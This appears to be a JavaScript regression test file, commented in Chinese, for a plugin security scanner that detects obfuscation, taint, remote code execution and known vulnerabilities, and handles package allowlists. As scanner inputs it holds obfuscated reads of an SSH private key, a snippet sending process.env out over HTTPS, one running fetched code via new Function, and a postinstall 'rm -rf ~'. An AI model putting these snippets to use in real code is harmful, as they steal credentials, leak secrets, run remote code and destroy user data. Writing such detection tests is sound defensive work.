// 0.5.0 加固回归：混淆折叠 / 文件级污点 / 远程代码执行 / OSV 漏洞 / 包自带豁免。
//
// 反向插桩：本文件的 [A][B] 在 0.4.1（纯正则 + 只折叠拼接）上大面积打红，
// 因为那时没有 Base64 / fromCharCode / join 折叠，也没有污点配对与 RCE 检测。
import { scanSourceText } from '../lib/security.js';
import { fileURLToPath } from 'node:url';
import { resolve } from 'node:path';
import { scanSourceDir } from '../lib/index.js';
import { checkCandidate, RULE_IDS } from '../lib/rules.js';
import { checkVulnerabilities, queryOsv, severityOf, clearOsvCache } from '../lib/osv.js';
import { foldObfuscation, detectTaint, detectRemoteCode } from '../lib/source-scan.js';

let failures = 0;
const ok = (label, condition, extra) => {
  if (condition) console.log(`  ok   ${label}`);
  else {
    failures += 1;
    console.log(`  FAIL ${label}${extra === undefined ? '' : ' -> ' + JSON.stringify(extra)}`);
  }
};
const levelOf = (report, id) => {
  const list = Array.isArray(report) ? report : report?.checks || [];
  const hit = list.find((c) => c.id === id);
  return hit ? hit.level : 'MISSING';
};
const ids = (report) => (Array.isArray(report) ? report : report?.checks || []).map((c) => c.id);

const env = (over = {}) => ({
  dshVersion: '0.3.0',
  dshVersionKnown: true,
  nodeVersion: '24.18.0',
  availableClientPackages: [],
  installedVersions: {},
  profileBundles: [],
  bundleSoftLimit: 40,
  knownBad: [],
  ...over,
});
const manifest = (over = {}) => ({
  name: 'demo-plugin',
  version: '1.0.0',
  main: 'lib/index.js',
  license: 'MIT',
  repository: 'https://example.com/demo',
  engines: { dsh: '>=0.2.0', node: '>=18' },
  ...over,
});

// ── [A] 常量折叠：把运行期拼出来的字符串在扫描时算出来 ─────────────────────
console.log('\n[A] 混淆折叠');
{
  ok('String.fromCharCode → 命中凭据读取', scanSourceText('const p = String.fromCharCode(46,115,115,104); fs.readFileSync(home + p + "/id_rsa")', 'a.js').some((h) => h.id === 'priv-ssh' && h.level === 'block'));
  ok('Buffer.from(base64) → 命中', scanSourceText("const f = Buffer.from('Li9zc2gvaWRfcnNh','base64').toString(); fs.readFileSync(f)", 'b.js').some((h) => h.level === 'block'));
  ok("['.s','sh'].join('') → 命中", scanSourceText("const d = ['.s','sh'].join(''); fs.readFileSync(home + d + '/id_rsa')", 'c.js').some((h) => h.level === 'block'));
  ok('\\x 转义 → 命中', scanSourceText('fs.readFileSync("\\x2e\\x73\\x73\\x68/id_rsa")', 'd.js').some((h) => h.level === 'block'));
  ok('折叠函数本身可复用', foldObfuscation('String.fromCharCode(97,98)').includes('"ab"'), foldObfuscation('String.fromCharCode(97,98)'));
  // 反向：正常代码不能被折叠出假阳性
  ok('正常字符串数组不误报', scanSourceText("const arr = ['a','b'].join(''); console.log(arr)", 'e.js').length === 0);
}

// ── [B] 文件级污点 + 远程代码执行 ──────────────────────────────────────────
console.log('\n[B] 语义层：污点配对 / 远程代码执行');
{
  const exfil = "const s = ['no','de',':h','tt','ps'].join(''); import(s).then(m => m.request({ path: '/?d=' + JSON.stringify(process.env) }))";
  ok('动态 import 外传 env → 命中 priv-env-exfil', scanSourceText(exfil, 'f.js').some((h) => h.id === 'priv-env-exfil'));

  const rce = "const code = await (await fetch('https://x/p.txt')).text(); new Function('require', code)(require)";
  ok('远程内容 new Function → mal-remote-code block', scanSourceText(rce, 'g.js').some((h) => h.id === 'mal-remote-code' && h.level === 'block'));

  ok('detectTaint 需要敏感读 + 网络出口同时存在', detectTaint('console.log(process.env.NODE_ENV)') === null);
  ok('只有网络出口不算外传', detectTaint("fetch('https://api.example.com/x')") === null);
  ok('detectRemoteCode 需要 RCE + 供给源', detectRemoteCode('const f = new Function("a", "return a")') === null);

  // 反向：正常插件代码不该命中语义层
  ok('正常本地 require 不误报', scanSourceText("const x = require('./lib/util')", 'h.js').length === 0);
}

// ── [C] 扫描目录：仍然不自己拦自己 ─────────────────────────────────────────
console.log('\n[C] 扫描本插件源码目录（自扫描）');
{
  const hits = await scanSourceDir(resolve(fileURLToPath(new URL('..', import.meta.url))));
  const blocks = hits.filter((h) => h.level === 'block');
  ok('自扫描不再产生 block（只有 warn）', blocks.length === 0, blocks.map((h) => `${h.id}:${h.file}`));
  console.log(`       扫描命中 ${hits.length} 条（全部 warn），文件：${[...new Set(hits.map((h) => h.file))].slice(0, 4).join(', ')}`);
}

// ── [D] OSV 已知漏洞 ──────────────────────────────────────────────────────
console.log('\n[D] sec-vulns（用注入的 fetch，不依赖网络）');
{
  const fake = (payload, status = 200) => async () => ({
    ok: status === 200,
    status,
    json: async () => payload,
  });

  clearOsvCache();
  const high = await queryOsv({
    name: 'demo-vuln',
    version: '1.0.0',
    fetchImpl: fake({ vulns: [{ id: 'GHSA-test-1', summary: 'RCE', database_specific: { severity: 'HIGH' } }] }),
  });
  ok('高危漏洞解析出来', high.vulns?.[0]?.severity === 'high', high);

  const many = checkVulnerabilities({ name: 'demo-vuln', version: '1.0.0', ...high });
  ok('同一 id 只产生一条检查项', many.filter((c) => c.id === 'sec-vulns').length === 1, many.map((c) => c.id));
  ok('高危 → block', many[0].level === 'block');

  const low = await queryOsv({
    name: 'demo-low',
    version: '1.0.0',
    fetchImpl: fake({ vulns: [{ id: 'GHSA-test-2', database_specific: { severity: 'MODERATE' } }] }),
  });
  ok('中危 → warn', checkVulnerabilities({ name: 'demo-low', version: '1.0.0', ...low })[0].level === 'warn');

  const none = checkVulnerabilities({ name: 'x', version: '1.0.0', vulns: [] });
  ok('无漏洞 → pass', none[0].level === 'pass');

  const broken = checkVulnerabilities({ name: 'x', version: '1.0.0', error: '查询超时' });
  ok('查询失败 → warn（不阻止安装）', broken[0].level === 'warn');

  ok('severityOf 兼容 GHSA 与 CVSS 风格', severityOf({ database_specific: { severity: 'CRITICAL' } }) === 'high' && severityOf({ affected: [{ database_specific: { severity: 'LOW' } }] }) === 'medium');

  // 缓存：第二次不应再调用 fetch
  clearOsvCache();
  let calls = 0;
  const counting = async () => {
    calls += 1;
    return { ok: true, status: 200, json: async () => ({ vulns: [] }) };
  };
  await queryOsv({ name: 'cache-demo', version: '1.0.0', fetchImpl: counting });
  await queryOsv({ name: 'cache-demo', version: '1.0.0', fetchImpl: counting });
  ok('同一 name@version 只打一次网络', calls === 1, calls);
}

// ── [E] 包自带豁免：只能降级，不能消失 ─────────────────────────────────────
console.log('\n[E] sec-allowlist');
{
  const risky = manifest({ scripts: { postinstall: 'rm -rf ~' } });
  const plain = checkCandidate({ spec: 'x', manifest: risky, env: env() });
  ok('无豁免 → block', levelOf(plain, 'sec-scripts') === 'block' && plain.ok === false);

  const allowed = checkCandidate({ spec: 'x', manifest: risky, env: env(), allowRules: ['sec-scripts'] });
  ok('有豁免 → 降为 warn（不是 pass）', levelOf(allowed, 'sec-scripts') === 'warn');
  ok('降级留痕', levelOf(allowed, 'sec-allowlist') === 'warn');
  ok('降级后不再阻止安装', allowed.ok === true);

  const unrelated = checkCandidate({ spec: 'x', manifest: manifest(), env: env(), allowRules: ['sec-scripts'] });
  ok('豁免未命中时只记一条 pass', levelOf(unrelated, 'sec-allowlist') === 'pass');

  const blocky = checkCandidate({ spec: 'x', manifest: risky, env: env(), allowRules: ['sec-vulns'] });
  ok('豁免别的规则不影响本条', levelOf(blocky, 'sec-scripts') === 'block');

  ok('RULE_IDS 收录三条新规则', ['sec-vulns', 'mal-remote-code', 'sec-allowlist'].every((id) => RULE_IDS.includes(id)));
}

// ── [F] 面板/报告一致性 ───────────────────────────────────────────────────
console.log('\n[F] 报告结构');
{
  const report = checkCandidate({ spec: 'x', manifest: manifest({ scripts: { postinstall: 'rm -rf ~' } }), env: env(), allowRules: ['sec-scripts'] });
  const seen = new Set();
  let dup = [];
  for (const id of ids(report)) {
    if (seen.has(id)) dup.push(id);
    seen.add(id);
  }
  ok('报告里没有重复的规则 id', dup.length === 0, dup);
}

console.log('\n==============================');
console.log(failures === 0 ? 'ALL PASS' : `${failures} FAILURES`);
process.exit(failures === 0 ? 0 : 1);
